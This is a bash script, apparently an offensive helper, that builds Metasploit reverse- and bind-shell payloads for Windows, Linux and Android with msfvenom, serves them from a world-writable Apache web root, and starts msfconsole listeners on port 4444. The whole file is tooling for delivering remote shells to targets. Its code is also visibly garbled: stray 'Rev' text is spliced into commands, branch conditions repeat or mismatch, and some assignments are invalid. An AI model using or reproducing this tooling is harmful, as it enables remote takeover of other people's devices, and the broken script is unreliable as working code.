#!/bin/bash
#Colors
b="\033[33m"
g="\033[32m"
r="\033[31m"
w="\033[00m"
#Colors
ip=$(hostname -I)
done=$(echo -e "$g Successfully created the payload.$w \nPATH= /var/www/html/ \nIP= $ip\nPORT= 4444\nGlHf for now.")

echo "Choose your platform :"
echo -e "$g 0.$w Skip the payload creation."
echo -e "$g 1.$w Windows"
echo -e "$g 2.$w Linux"
echo -e "$g 3.$w Android"
echo -ne "Choice : $g"
read resp1
echo -e "$w"

#Windows
if [ $resp1 = 1 ]; then
  clear
  echo -e "$g 1.$w Powershell - Reverse_TCP"
  echo -e "$g 2.$w Powershell - Bind_TCP"
  echo -e "$g 3.$w Shell - Reverse_TCP"
  echo -e "$g 4.$w Shell - Bind_TCP"
  echo -ne "Choice : $g"
  read resp2
  echo -e "$w"
#Linux
elif [ $resp1 = 2 ]; then
  clear
  echo -e "$g 1.$w Shell - Reverse_TCP"
  echo -e "$g 2.$w Shell - Bind_TCP"
  echo -ne "Choice : $g"
  read resp2
  echo -e "$w"
#Android
elif [ $resp1 = 2 ]; then
  clear
  echo -e "$g 1.$w Meterpreter - Reverse_TCP"
  echo -e "$g 2.$w Meterpreter - Bind_TCP"
  echo -ne "Choice : $g"
  read resp2
  echo -e "$w"
else
  echo -e "$r error.$w"
fi

#Skiping payload creation
if [ $resp1 = 0 ]; then
echo -e "$g Skipping the payload creation...$w"
payChoice = 0
#Windows - Powershell - Reverse_tcp
elif [ $resp1 = 1 ] && [ $resp2 = 1 ]; then
  clear
  echo -e "$g Creating payload...$w"
  msfvenom -p windows/powershell_reverse_tcp LHOST=$(hostname -I) LPORT=4444 -f powershell > /var/www/html/power.bat
  echo "$done"
  payChoice = 11
#Windows - Powershell - Bind_TCP
elif [ $resp1 = 1 ] && [ $resp2 = 2 ]; then
  clear
  echo -e "$g Creating payload...$w"
  msfvenom -p windows/powershell_bind_tcp RHOST=$(hostname -I) LPORT=4444 -f powershell > /var/www/html/power.bat
  echo "$done"
  payChoice = 12
#Windows - Shell - Reverse_tcp
if [ $resp1 = 1 ] && [ $resp2 = 3 ]; then
  clear
  echo -e "$g Creating payload...$w"
  msfvenom -p windows/shell/reverse_tcp LHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.bat
  echo "$done"
  payChoice = 13
#Windows - Shell - Bind_TCP
elif [ $resp1 = 1 ] && [ $resp2 = 4 ]; then
  clear
  echo -e "$g Creating payload...$w"
  msfvenom -p windows/shell/reverse_tcp RHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.bat
  echo "$done"
  payChoice = 14
#Linux - Shell - Reverse_TCP
elif [ $resp1 = 2 ] && [ $resp2 = 1 ]; then
  clear
  echo -e "$g Creating payload...$w"
  msfvenom -p linux/x86/shell/reverse_tcp LHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.sh
  echo "$done"
  payChoice = 21
#Linux - Shell - Bind_TCP
elif [ $resp1 = 2 ] && [ $resp2 = 2 ]; then
  clear
  echo -e "$g Creating payload...$w"
  msfvenom -p linux/x86/shell/bind_tcp RHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.sh
  echo "$done"
  payChoice = 22
#Android - Meterpreter - Reverse_TCPRev
elif [ $resp1 = 3 ] && [ $resp2 = 1 ]; thenRev
  clearRev
  echo -e "$g Creating payload...$w"Rev
  msfvenom -p android/meterpreter/reverse_tRevcp LHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.apk
  echo "$done"
  payChoice = 31
#Android - Meterpreter - Bind_TCP
elif [ $resp1 = 3 ] && [ $resp2 = 2 ]; then
  clear
  echo -e "$g Creating payload...$w"
  msfvenom -p android/meterpreter/bind_tcp RHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.apk
  echo "$done"
  payChoice = 32
else
  echo -e "$r error.$w"
fi

echo -e "$b CHMODing the payload.$w"
chmod 777 -R /var/www/html/
echo -e "$b Starting Apache2 service...$w"
service apache2 restart
echo -e "$b Apache2 successfuly restarted.$w"
service apache2 status

echo -e "$g Starting the listener.. (this may take a while..)$w"
cd rb
if [ $payChoice = 0 ]; then
  
elif [ $payChoice = 11 ]; then
  cd windows
  msfconsole -r ListenWindowsPowerRevTCP.rb
elif [ $payChoice = 12 ]; then
  cd windows
  msfconsole -r ListenWindowsPowerBindTCP.rb
elif [ $payChoice = 13 ]; then
  cd windows
  msfconsole -r ListenWindowsShellRevTCP.rb
elif [ $payChoice = 14 ]; then
  cd windows
  msfconsole -r ListenWindowsShellBindTCP.rb
elif [ $payChoice = 21 ]; then
  cd linux
  msfconsole -r ListenLinuxShellRevTCP.rb
elif [ $payChoice = 22 ]; then
  cd linux
  msfconsole -r ListenLinuxShellBindTCP.rb
elif [ $payChoice = 31 ]; then
  cd android
  msfconsole -r ListenAndroRevTCP.rb
elif [ $payChoice = 32 ]; then
  cd android
  msfconsole -r ListenAndroBindTCP.rb
fi